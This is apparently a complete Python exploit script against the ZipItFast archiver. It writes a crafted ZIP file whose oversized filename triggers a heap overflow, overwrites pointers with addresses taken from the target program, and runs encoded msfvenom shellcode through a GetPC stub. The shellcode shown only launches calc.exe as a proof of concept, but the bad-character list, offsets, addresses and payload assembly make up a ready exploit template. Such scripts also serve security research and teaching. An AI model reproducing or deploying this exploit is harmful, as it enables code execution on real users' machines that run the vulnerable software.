#!/usr/bin/env python
import struct

# Filename
file_name = "hodorlol.zip"

# Variables for headers
file_size = "\xe4\x0f"
dir_size = "\x12\x10\x00\x00"
offset_dir = "\x02\x10\x00\x00"

# Headers
ldf_header = (      "\x50\x4B\x03\x04\x14\x00\x00"
                    "\x00\x00\x00\xB7\xAC\xCE\x34\x00\x00\x00"
                    "\x00\x00\x00\x00\x00\x00\x00\x00"
                     + file_size +
                    "\x00\x00\x00" )

cdf_header = (      "\x50\x4B\x01\x02\x14\x00\x14"
                    "\x00\x00\x00\x00\x00\xB7\xAC\xCE\x34\x00\x00\x00"
                    "\x00\x00\x00\x00\x00\x00\x00\x00\x00"
                    + file_size +
                    "\x00\x00\x00\x00\x00\x00\x01\x00"
                    "\x24\x00\x00\x00\x00\x00\x00\x00" )

eofcdf_header = (   "\x50\x4B\x05\x06\x00\x00\x00\x00\x01\x00\x01\x00"
                     + dir_size + 
                     offset_dir +
                    "\x00\x00" )

# Badchars
# "\x00\x0a\x0d\x0f\x14\x15\x2f\x3a\x3b\x5c" 
goodchars = (
"\x01\x02\x03\x04\x05\x06\x07\x08\x09\x0b\x0c\x0e\x10\x11\x12\x13\x16\x17\x18\x19\x1a\x1b\x1c\x1d\x1e\x1f\x20\x21\x22\x23"
"\x24\x25\x26\x27\x28\x29\x2a\x2b\x2c\x2d\x2e\x30\x31\x32\x33\x34\x35\x36\x37\x38\x39\x3c\x3d\x3e\x3f\x40\x41\x42\x43\x44\x45\x46"
"\x47\x48\x49\x4a\x4b\x4c\x4d\x4e\x4f\x50\x51\x52\x53\x54\x55\x56\x57\x58\x59\x5a\x5b\x5d\x5e\x5f\x60\x61\x62\x63\x64\x65\x66\x67"
"\x68\x69\x6a\x6b\x6c\x6d\x6e\x6f\x70\x71\x72\x73\x74\x75\x76\x77\x78\x79\x7a\x7b\x7c\x7d\x7e\x7f"
)

# Shellcode
# msfvenom -p windows/exec cmd=calc.exe -e x86/alpha_mixed -f python -b "\x00\x0a\x0d\x0f\x14\x15\x2f\x3a\x3b\x5c" -v shellcode bufferregister=esi
# Payload size: 440 bytes
shellcode =  ""
shellcode += "\x56\x59\x49\x49\x49\x49\x49\x49\x49\x49\x49\x49"
shellcode += "\x49\x49\x49\x49\x49\x49\x37\x51\x5a\x6a\x41\x58"
shellcode += "\x50\x30\x41\x30\x41\x6b\x41\x41\x51\x32\x41\x42"
shellcode += "\x32\x42\x42\x30\x42\x42\x41\x42\x58\x50\x38\x41"
shellcode += "\x42\x75\x4a\x49\x6b\x4c\x5a\x48\x6c\x42\x53\x30"
shellcode += "\x35\x50\x33\x30\x63\x50\x6b\x39\x4d\x35\x66\x51"
shellcode += "\x39\x50\x43\x54\x4c\x4b\x32\x70\x70\x30\x6c\x4b"
shellcode += "\x63\x62\x56\x6c\x4c\x4b\x36\x32\x72\x34\x6c\x4b"
shellcode += "\x71\x62\x34\x68\x74\x4f\x78\x37\x70\x4a\x61\x36"
shellcode += "\x54\x71\x59\x6f\x4e\x4c\x37\x4c\x53\x51\x61\x6c"
shellcode += "\x77\x72\x36\x4c\x55\x70\x49\x51\x7a\x6f\x56\x6d"
shellcode += "\x76\x61\x4f\x37\x49\x72\x39\x62\x33\x62\x56\x37"
shellcode += "\x6c\x4b\x50\x52\x56\x70\x4c\x4b\x61\x5a\x67\x4c"
shellcode += "\x6e\x6b\x50\x4c\x76\x71\x70\x78\x4a\x43\x31\x58"
shellcode += "\x37\x71\x6a\x71\x46\x31\x6c\x4b\x61\x49\x31\x30"
shellcode += "\x56\x61\x49\x43\x6e\x6b\x73\x79\x64\x58\x39\x73"
shellcode += "\x67\x4a\x50\x49\x6c\x4b\x44\x74\x6e\x6b\x63\x31"
shellcode += "\x78\x56\x36\x51\x39\x6f\x4e\x4c\x7a\x61\x58\x4f"
shellcode += "\x56\x6d\x55\x51\x6f\x37\x44\x78\x6b\x50\x63\x45"
shellcode += "\x6a\x56\x46\x63\x51\x6d\x4b\x48\x65\x6b\x51\x6d"
shellcode += "\x55\x74\x31\x65\x38\x64\x66\x38\x6c\x4b\x70\x58"
shellcode += "\x37\x54\x67\x71\x39\x43\x61\x76\x6e\x6b\x54\x4c"
shellcode += "\x32\x6b\x6c\x4b\x42\x78\x75\x4c\x67\x71\x48\x53"
shellcode += "\x6c\x4b\x77\x74\x6e\x6b\x45\x51\x6a\x70\x6f\x79"
shellcode += "\x71\x54\x57\x54\x47\x54\x31\x4b\x53\x6b\x50\x61"
shellcode += "\x71\x49\x33\x6a\x42\x71\x59\x6f\x79\x70\x71\x4f"
shellcode += "\x73\x6f\x72\x7a\x4c\x4b\x56\x72\x38\x6b\x4c\x4d"
shellcode += "\x73\x6d\x53\x5a\x33\x31\x4c\x4d\x6e\x65\x68\x32"
shellcode += "\x35\x50\x73\x30\x33\x30\x56\x30\x61\x78\x65\x61"
shellcode += "\x4e\x6b\x72\x4f\x4b\x37\x39\x6f\x6a\x75\x6f\x4b"
shellcode += "\x6a\x50\x38\x35\x39\x32\x66\x36\x71\x78\x69\x36"
shellcode += "\x5a\x35\x6f\x4d\x6f\x6d\x79\x6f\x59\x45\x67\x4c"
shellcode += "\x46\x66\x33\x4c\x44\x4a\x4b\x30\x4b\x4b\x4b\x50"
shellcode += "\x70\x75\x47\x75\x6d\x6b\x53\x77\x74\x53\x43\x42"
shellcode += "\x42\x4f\x70\x6a\x45\x50\x43\x63\x49\x6f\x69\x45"
shellcode += "\x75\x33\x51\x71\x42\x4c\x32\x43\x34\x6e\x63\x55"
shellcode += "\x62\x58\x70\x65\x33\x30\x41\x41"

# GetPC ESI method to align ESP and stack
# Written by Peter Van Eeckhoutte
getpc = (
            "\xEB\x05"                                      # jmp short (5 bytes) to 'jmp back' at end
            "\x5E"                                          # pop esi
            "\x41"                                          # nop (inc ecx)
            "\xFF\xD6"                                      # call esi
            "\x41"                                          # nop (inc ecx)
            "\xE8\xF6\xFF\xFF\xFF"                          # jmp back to pop esi
)

# Jump over FLINK/BLINK
jump = "\xeb\x08"                                           # jmp short 0x0a

# Lengths
maxlen = 4068

# Offsets
crash_eax = 256
crash_edx = 260
crash_ecx = 264

# Variables
prefix = "G" * (crash_eax - len(jump))                      # Filler
prefix += jump                                              # Jump instructions
eax = struct.pack("<L", 0x0012fb90)                         # 00401C76 # MOV DWORD PTR DS:[EDX],EAX     # ZipItFast.exe
edx = struct.pack("<L", 0x0012fb7c)                         # 00401C78 # MOV DWORD PTR DS:[EAX+4],EDX   # ZipItFast.exe
suffix = "G" * 200                                          # Filler
suffix += getpc                                             # Align ESP
suffix += shellcode                                         # Shellcode
suffix += "G" * (maxlen - len(prefix + eax + edx + suffix)) # Filler

# Construct payload
payload = prefix + eax + edx + suffix

# Check if size matches
if len(payload) != 4068:
    print("[!] Warning, payload size isn't correct!")

# Craft final string to save as file
exploit = ldf_header + payload + cdf_header + payload + eofcdf_header

print("Size : {s}".format(s=len(payload)))
with open(file_name, 'w') as f:
    f.write(exploit)

